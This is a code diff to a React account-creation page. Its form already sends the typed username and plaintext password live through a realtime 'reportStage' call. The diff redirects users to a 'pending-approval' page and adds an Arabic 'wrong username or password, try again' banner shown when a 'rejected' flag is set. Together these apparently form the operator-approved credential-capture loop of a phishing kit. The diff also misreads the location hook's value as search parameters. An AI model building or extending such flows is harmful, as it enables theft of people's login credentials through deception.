@@ -6,7 +6,7 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { useRegistration } from '@/context/RegistrationContext';
 import { useRealtime } from '@/context/RealtimeContext';
-import { ChevronLeft, ChevronRight, Eye, EyeOff } from 'lucide-react';
+import { ChevronLeft, ChevronRight, Eye, EyeOff, AlertCircle } from 'lucide-react';
 
 export default function CreateAccount() {
   const [, setLocation] = useLocation();
@@ -15,6 +15,8 @@ export default function CreateAccount() {
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [errors, setErrors] = useState<Record<string, string>>({});
+  const [searchParams] = useLocation();
+  const isRejected = searchParams.includes('rejected=true');
 
   useEffect(() => {
     reportStage('create_account', {});
@@ -33,7 +35,7 @@ export default function CreateAccount() {
     e.preventDefault();
     if (validate()) {
       reportStage('create_account', { username: data.username, password });
-      setLocation('/verify');
+      setLocation('/pending-approval');
     }
   };
 
@@ -53,6 +55,16 @@ export default function CreateAccount() {
 
         <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
           <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary via-primary/50 to-transparent" />
+          
+          {/* رسالة الرفض */}
+          {isRejected && (
+            <div className="mb-6 p-4 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-xl flex items-center gap-3 animate-in slide-in-from-top-2 duration-300">
+              <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
+              <p className="text-red-600 dark:text-red-400 text-sm font-medium">
+                اسم المستخدم أو كلمة المرور غير صحيحة. يرجى إعادة المحاولة.
+              </p>
+            </div>
+          )}
           
           <form onSubmit={handleSubmit} className="space-y-8 relative z-10">
             <div className="space-y-3">
